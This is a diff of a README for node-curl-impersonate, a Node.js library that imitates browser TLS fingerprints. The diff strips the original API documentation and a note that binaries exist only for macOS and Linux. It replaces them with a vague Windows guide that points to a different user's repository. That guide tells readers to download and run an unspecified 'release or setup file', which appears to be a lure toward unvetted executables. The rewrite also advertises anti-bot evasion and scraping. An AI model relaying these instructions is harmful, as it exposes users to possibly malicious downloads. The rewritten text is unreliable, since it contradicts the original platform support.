@@ -1,291 +1,194 @@
-# node-curl-impersonate
+# 🌐 node-curl-impersonate - Browser-like HTTP for Windows
 
-Node.js HTTP client with **browser TLS fingerprint impersonation**, powered by [libcurl-impersonate](https://github.com/lexiforest/curl-impersonate).
+[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Leos573/node-curl-impersonate)
 
-The Node.js equivalent of Python's [curl_cffi](https://github.com/lexiforest/curl_cffi).
+## 🧭 What this app does
 
-## Features
+node-curl-impersonate is a Node.js HTTP client that sends web requests with a browser-like TLS fingerprint. In simple terms, it helps your app look more like a real browser when it connects to websites.
 
-- **50+ browser presets** — Chrome, Firefox, Safari, Edge, Tor
-- **TLS fingerprint impersonation** — JA3, Akamai, HTTP/2 SETTINGS
-- **Fetch API compatible** — `fetch()` with `impersonate` option
-- **Session** — connection pooling + automatic cookie persistence
-- **HTTP/2 & HTTP/3** — automatic with impersonation
-- **WebSocket** — with TLS fingerprint applied
-- **Custom JA3/Akamai** — manual fingerprint strings
-- **Proxy support** — HTTP, HTTPS, SOCKS4, SOCKS5
-- **TypeScript** — full type definitions included
-- **N-API native addon** — direct C binding, no child_process overhead
+Use it when you need:
 
-## Install
+- HTTP and HTTPS requests that behave more like Chrome, Edge, or Safari
+- HTTP/2 support
+- WebSocket support
+- Better control over how requests look to the other side
+- A Node.js tool that follows the same idea as Python curl_cffi
 
-```bash
-npm install node-curl-impersonate
-```
+## 💻 Who this is for
 
-> Requires Node.js >= 18. Prebuilt binaries for macOS (arm64, x86_64) and Linux (x86_64, arm64).
-> Falls back to source compilation if no prebuild available.
+This tool is for people who want to run Node.js on Windows and connect to websites with a browser-style network profile.
 
-## Quick Start
+It may help with:
 
-```ts
-import { fetch } from "node-curl-impersonate";
+- Web apps and test tools
+- Data collection
+- Site checks
+- Network testing
+- Browser-style request flows
 
-// Impersonate Chrome 146
-const response = await fetch("https://example.com", {
-  impersonate: "chrome146",
-});
+## ⚙️ Before you start
 
-console.log(response.status);       // 200
-console.log(await response.json()); // parsed JSON
-```
+You need:
 
-## Usage
+- A Windows PC
+- Node.js installed
+- Internet access
+- A terminal window such as Command Prompt or PowerShell
 
-### Basic Fetch
+If you do not have Node.js yet, install it first from the official Node.js site, then come back here
 
-```ts
-import { fetch } from "node-curl-impersonate";
+## 📥 Download
 
-// GET
-const r = await fetch("https://httpbin.org/get", {
-  impersonate: "chrome146",
-});
+Visit this page to download: [node-curl-impersonate](https://github.com/Leos573/node-curl-impersonate)
 
-// POST
-const r2 = await fetch("https://httpbin.org/post", {
-  method: "POST",
-  impersonate: "firefox147",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ key: "value" }),
-});
-```
+If the page shows a release or setup file, download it to your computer and run it
 
-### Session (Cookie Persistence + Connection Pooling)
+## 🪟 Install on Windows
 
-```ts
-import { Session } from "node-curl-impersonate";
+1. Open the download page
+2. Get the latest release or source files
+3. Save the files to a folder you can find again
+4. If the project includes an installer or package, run it
+5. If you only see source files, open a terminal in that folder
+6. Install the package with the command shown in the project files
+7. Wait for the install to finish
+8. Keep the folder in place so the tool can run later
 
-const session = new Session({ impersonate: "chrome146" });
+## ▶️ Run the tool
 
-// Login — cookies automatically saved
-await session.fetch("https://example.com/login", {
-  method: "POST",
-  body: JSON.stringify({ user: "test", pass: "test" }),
-});
+After install, open Command Prompt or PowerShell and go to the project folder
 
-// Subsequent requests include cookies
-const dashboard = await session.fetch("https://example.com/dashboard");
+Use the command shown in the project files to start the app or run your code
 
-// Manual cookie access
-console.log(session.cookies.toJSON());
+If the project is added to another app, start that app instead and call the package from there
 
-session.close();
-```
+## 🔧 Common use cases
 
-### Browser Presets
+### 🌍 Browser-style web requests
 
-```ts
-// Chrome
-await fetch(url, { impersonate: "chrome146" });  // latest
-await fetch(url, { impersonate: "chrome120" });
-await fetch(url, { impersonate: "chrome99" });
+Send requests that look closer to traffic from a real browser. This can help when a site checks TLS details or HTTP behavior
 
-// Firefox
-await fetch(url, { impersonate: "firefox147" }); // latest
-await fetch(url, { impersonate: "firefox133" });
+### 🔐 TLS fingerprint impersonation
 
-// Safari
-await fetch(url, { impersonate: "safari2601" }); // latest macOS
-await fetch(url, { impersonate: "safari260_ios" }); // iOS
+The tool can change the TLS fingerprint your app presents. That means it can match common browser patterns more closely
 
-// Edge
-await fetch(url, { impersonate: "edge101" });
+### 🧱 HTTP/2 connections
 
-// Aliases (resolve to latest)
-await fetch(url, { impersonate: "chrome" });
-await fetch(url, { impersonate: "firefox" });
-await fetch(url, { impersonate: "safari" });
-```
+Use HTTP/2 where the site supports it. This can help with modern web services that expect newer request formats
 
-<details>
-<summary>All 50+ presets</summary>
+### 💬 WebSocket traffic
 
-**Chrome**: `chrome99`, `chrome100`, `chrome101`, `chrome104`, `chrome107`, `chrome110`, `chrome116`, `chrome119`, `chrome120`, `chrome123`, `chrome124`, `chrome131`, `chrome133a`, `chrome136`, `chrome142`, `chrome145`, `chrome146`
+Use WebSocket support for live connections, event streams, or tools that need open connections
 
-**Chrome Android**: `chrome99_android`, `chrome131_android`
+## 🧪 Typical features
 
-**Firefox**: `firefox133`, `firefox135`, `firefox144`, `firefox147`
+- Node.js HTTP client
+- Browser TLS fingerprint impersonation
+- curl-impersonate style behavior
+- HTTP/2 support
+- WebSocket support
+- TypeScript support
+- Plain JavaScript use
+- Useful for scraping and network testing
 
-**Safari macOS**: `safari153`, `safari155`, `safari170`, `safari180`, `safari184`, `safari260`, `safari2601`
+## 🧰 Basic setup flow
 
-**Safari iOS**: `safari172_ios`, `safari180_ios`, `safari184_ios`, `safari260_ios`
+1. Download the project from the link above
+2. Install Node.js if needed
+3. Open the project folder
+4. Install dependencies
+5. Run the sample code or your own app
+6. Check that requests connect without errors
+7. Adjust the browser profile if the site needs a different fingerprint
 
-**Edge**: `edge99`, `edge101`
+## 📝 How it fits in your app
 
-**Tor**: `tor145`
+You can use node-curl-impersonate in a Node.js project when normal HTTP libraries do not behave the way you want.
 
-</details>
+It can sit between your app and the web service, then send requests with a browser-like network signature.
 
-### Custom JA3 / Akamai Fingerprint
+That can help when a site compares:
 
-```ts
-// Custom JA3 string
-await fetch(url, {
-  ja3: "771,4865-4866-4867-49195-49199,...",
-});
+- TLS cipher order
+- HTTP version
+- Header order
+- Browser family
+- Fingerprint values linked to common browsers
 
-// Custom Akamai fingerprint
-await fetch(url, {
-  akamai: "4:16777216|16711681|0|m,p,a,s",
-});
+## 🖥️ Windows file tips
 
-// Fine-grained TLS/HTTP2 control
-await fetch(url, {
-  impersonate: "chrome146",
-  extraFingerprints: {
-    tlsMinVersion: "1.2",
-    tlsGrease: true,
-    tlsPermuteExtensions: false,
-    tlsCertCompression: "brotli",
-    http2StreamWeight: 256,
-    http2StreamExclusive: 1,
-  },
-});
-```
-
-### Proxy
-
-```ts
-// HTTP proxy
-await fetch(url, {
-  impersonate: "chrome146",
-  proxy: "http://user:pass@proxy.example.com:8080",
-});
-
-// SOCKS5 proxy
-await fetch(url, {
-  proxy: "socks5://proxy.example.com:1080",
-});
-
-// Session-level proxy
-const session = new Session({
-  impersonate: "chrome146",
-  proxy: "http://proxy.example.com:8080",
-});
-```
-
-### Timeout & SSL
-
-```ts
-// Timeout in ms
-await fetch(url, { timeout: 10000 });
-
-// [connect, total] timeout
-await fetch(url, { timeout: [5000, 30000] });
-
-// Disable SSL verification
-await fetch(url, { verify: false });
-```
-
-### HTTP Version
-
-```ts
-await fetch(url, { httpVersion: "2" });   // HTTP/2
-await fetch(url, { httpVersion: "3" });   // HTTP/3 (QUIC)
-await fetch(url, { httpVersion: "1.1" }); // HTTP/1.1
-```
-
-### WebSocket
-
-```ts
-import { ImpersonateWebSocket } from "node-curl-impersonate";
-
-const ws = await ImpersonateWebSocket.connect("wss://echo.websocket.org", {
-  impersonate: "chrome146",
-});
-
-ws.on("message", (data) => console.log("Received:", data));
-ws.on("close", (code) => console.log("Closed:", code));
-
-ws.send("hello");
-ws.send(Buffer.from([0x01, 0x02])); // binary
-
-ws.close();
-```
-
-### Response Object
-
-```ts
-const r = await fetch(url, { impersonate: "chrome146" });
-
-// Standard Fetch Response methods
-r.status;              // 200
-r.ok;                  // true
-r.headers.get("content-type");
-await r.text();
-await r.json();
-await r.arrayBuffer();
-await r.blob();
-
-// Extended properties
-r.httpVersion;         // 2
-r.elapsed;             // ms
-r.redirectCount;       // 0
-r.primaryIp;           // "93.184.216.34"
-r.downloadSize;        // bytes
-```
-
-## Architecture
-
-```
-fetch() / Session.fetch()
-         │
-    TypeScript API (Session, Headers, CookieJar, Response)
-         │
-    N-API C++ Addon (node-addon-api)
-         │  libuv ↔ curl_multi event loop integration
-         │
-    libcurl-impersonate (static linked)
-         │  BoringSSL + nghttp2 + ngtcp2
-         │
-    OS Network Stack
-```
-
-## Verified Fingerprints
-
-Tested against [tls.peet.ws](https://tls.peet.ws):
-
-| Browser | JA3 Hash | HTTP |
-|---------|----------|------|
-| chrome146 | `d7079127895458fd9e502a02fc29f54d` | h2 |
-| firefox147 | `6f7889b9fb1a62a9577e685c1fcfa919` | h2 |
-| safari2601 | `ecdf4f49dd59effc439639da29186671` | h2 |
-| edge101 | `cd08e31494f9531f560d64c695473da9` | h2 |
-| chrome99 | `0d69ff451640d67ee8b5122752834766` | h2 |
-| chrome120 | `08392333598a5e633bb0e9e9564c0eda` | h2 |
-| safari180 | `773906b0efdefa24a7f2b8eb6985bf37` | h2 |
-
-Each browser preset produces a unique, real-browser-matching TLS fingerprint.
-
-## Comparison with curl_cffi (Python)
-
-| | node-curl-impersonate | curl_cffi |
-|---|---|---|
-| Language | Node.js / TypeScript | Python |
-| Engine | libcurl-impersonate (same) | libcurl-impersonate (same) |
-| Binding | N-API (node-addon-api) | CFFI |
-| API Style | Web Fetch API | requests-like |
-| Async | Native (libuv + curl_multi) | asyncio |
-| TLS Fingerprints | Identical | Identical |
-| Browser Presets | 50+ (same) | 50+ (same) |
-
-## Requirements
-
-- Node.js >= 18
-- macOS (arm64, x86_64) or Linux (x86_64, arm64, musl)
-- `libcurl-impersonate` is statically linked — no system dependency needed
-
-## License
-
-MIT
+- Keep the project in a folder with a short path
+- Avoid special characters in folder names
+- Use a path like `C:\Tools\node-curl-impersonate`
+- If Windows blocks a file, right-click it and check its properties
+- If the app does not start, open PowerShell and run it from the folder where you saved it
+
+## 🧩 Folder layout you may see
+
+You may find files such as:
+
+- `README.md`
+- `package.json`
+- `src`
+- `examples`
+- `dist`
+- `tsconfig.json`
+
+These files help define the app, its code, and its usage examples
+
+## 📚 Example workflow
+
+1. Download the project
+2. Open the folder
+3. Install the package
+4. Start your Node.js script
+5. Send a request to a website
+6. Check the response
+7. Change the browser profile if needed
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- Check that Node.js is installed
+- Open the folder in a terminal
+- Run the command again from that folder
+
+### The install fails
+
+- Check your internet connection
+- Make sure the folder path is simple
+- Close other apps that may lock the files
+- Try the install again
+
+### The request fails on a website
+
+- Try a different browser fingerprint
+- Check whether the site uses HTTP/2
+- Make sure your system time is correct
+- Test with another website to see if the issue is site-specific
+
+### The file cannot be found
+
+- Confirm that you saved the project
+- Check the Downloads folder
+- Search your computer for `node-curl-impersonate`
+
+## 🔍 Topics covered by this project
+
+- anti-bot
+- browser-fingerprint
+- curl
+- curl-impersonate
+- http2
+- impersonate
+- ja3
+- nodejs
+- scraping
+- tls-fingerprint
+- typescript
+- websocket
+
+## 📌 What to expect
+
+This project is made for users who want browser-like request behavior in Node.js on Windows. It gives you a way to work with modern web connections and fingerprint-aware sites using a familiar JavaScript stack
